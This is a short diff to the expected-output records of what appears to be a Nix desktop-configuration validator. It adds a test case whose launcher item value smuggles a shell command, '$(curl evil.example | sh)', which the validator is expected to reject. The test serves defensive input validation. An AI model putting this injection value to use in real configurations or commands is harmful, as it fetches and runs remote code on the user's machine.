@@ -2671,6 +2671,7 @@
             test/desktops/imports.nix: may not import modules — a desktop is one file's worth of values, and what it can reach has to be readable from that file alone
             test/desktops/internal-wiring.nix: haus._contrib is internal wiring between rooms, not a setting a desktop may write
             test/desktops/launcher-item-key.nix: haus.launcher.items.filesearch is not an item key (expected cmd:<id>, app:<path>, setting:<pane>[?<anchor>] or mode:<name>)
+            test/desktops/launcher-item-shell.nix: haus.launcher.items.mode:"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks, newlines or tabs
             test/desktops/launcher-item-shortcut.nix: haus.launcher.items.shortcut:0ECC8F7A-3A52-467A-84C0-511CCE1CB9B7 names one entry in one Mac's Shortcuts library, which is a fact about that machine rather than a taste a desktop can share
             test/desktops/missing-haus.nix: has no `haus` settings — a desktop is { haus = { … }; }
             test/desktops/module-internals.nix: may not set module-system internals
@@ -2732,6 +2733,7 @@
             imports.nix class=desktop ok=false sets=1 rooms=haus silent=12
             internal-wiring.nix class=desktop ok=false sets=1 rooms=- silent=12
             launcher-item-key.nix class=desktop ok=false sets=1 rooms=launcher silent=11
+            launcher-item-shell.nix class=desktop ok=false sets=1 rooms=launcher silent=11
             launcher-item-shortcut.nix class=desktop ok=false sets=1 rooms=launcher silent=11
             missing-haus.nix class=desktop ok=false sets=0 rooms=- silent=12
             module-internals.nix class=desktop ok=false sets=1 rooms=haus silent=12
